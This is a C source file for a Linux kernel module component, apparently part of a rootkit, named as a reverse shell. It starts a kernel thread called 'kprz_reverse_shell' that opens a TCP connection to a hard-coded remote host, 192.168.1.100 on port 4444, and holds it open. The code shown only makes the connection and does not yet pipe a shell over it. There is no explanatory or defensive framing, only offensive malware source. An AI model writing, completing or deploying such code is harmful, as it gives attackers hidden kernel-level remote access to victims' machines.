#include "reverse_shell.h"
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/socket.h>
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <net/net_namespace.h>

#define REMOTE_IP   "192.168.1.100"
#define REMOTE_PORT 4444

static struct task_struct *reverse_shell_task;

static int reverse_shell_fn(void *data) {
    struct socket *sock;
    struct sockaddr_in addr;
    int ret;

    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (ret < 0)
        return ret;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(REMOTE_PORT);
    addr.sin_addr.s_addr = in_aton(REMOTE_IP);

    ret = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
    if (ret < 0) {
        sock_release(sock);
        return ret;
    }

    while (!kthread_should_stop()) {
        msleep(5000);
    }

    sock_release(sock);
    return 0;
}

void start_reverse_shell(void) {
    if (!reverse_shell_task)
        reverse_shell_task = kthread_run(reverse_shell_fn, NULL, "kprz_reverse_shell");
}